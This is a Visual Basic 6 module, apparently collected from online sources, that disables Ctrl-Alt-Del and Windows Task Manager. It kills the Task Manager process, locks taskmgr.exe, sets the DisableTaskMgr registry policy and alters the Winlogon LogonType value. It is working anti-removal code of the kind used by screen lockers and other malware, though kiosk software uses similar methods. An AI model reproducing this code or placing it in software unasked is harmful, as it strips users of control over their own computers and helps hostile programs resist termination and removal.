Attribute VB_Name = "modTask"
Option Explicit

Public PreviousRegValue As String

'// GATHERED FROM SOURCES ON THE INTERNET

'// STOP CTL-ALT-DEL
Public Sub AntiTaskManagerController(Enabled As Boolean)
    On Error Resume Next
    If IsWinNT Then
        Call NTController(TASK_MGR, Enabled)
        If Enabled Then
            Close #1
            SetKeyValue HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "LogonType", PreviousRegValue, REG_DWORD
        Else
            Dim TMHwnd              As Long
            Dim ProcID              As Long
            Dim ProcessName         As Long
            Dim retVal              As Long

            PreviousRegValue = Query_Value(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "LogonType")
            SetKeyValue HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "LogonType", "1", REG_DWORD
            
            TMHwnd = FindWindow("#32770", "Windows Task Manager")
            retVal = GetWindowThreadProcessId(TMHwnd, ProcID)
            ProcessName = OpenProcess(&H1F0FFF, 0&, ProcID)
            retVal = TerminateProcess(ProcessName, 0&)
            Open Environ("WinDir") & "\System32\Taskmgr.exe" For Input Lock Read Write As #1
        End If
    Else
        SystemParametersInfo 97, Enabled, Enabled, 0
    End If
End Sub

Public Sub NTController(ByVal EnmPrivilage As EnumNTSettings, ByVal Enabled As Boolean)
    If Not IsWinNT Then Exit Sub
    Dim Command As String
    Command = "DisableTaskMgr"
    If IsWinNT Then
        Call CreateRegLong(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Policies\System", Command, Not Enabled)
        If IsW2000 Then Call CreateRegLong(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Group Policy Objects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Policies\System", Command, Not Enabled)
    End If
End Sub

Public Function IsWinNT() As Boolean
    Dim OSInfo    As OSVERSIONINFO
    OSInfo.dwOSVersionInfoSize = Len(OSInfo)
    GetVersionEx OSInfo
    IsWinNT = (OSInfo.dwPlatformId = 2)
End Function

Public Function IsW2000() As Boolean
    Dim OSInfo    As OSVERSIONINFO
    OSInfo.dwOSVersionInfoSize = Len(OSInfo)
    GetVersionEx OSInfo
    If (OSInfo.dwMajorVersion & "." & OSInfo.dwMinorVersion) = "5.0" Then: IsW2000 = True: Else: IsW2000 = False
End Function
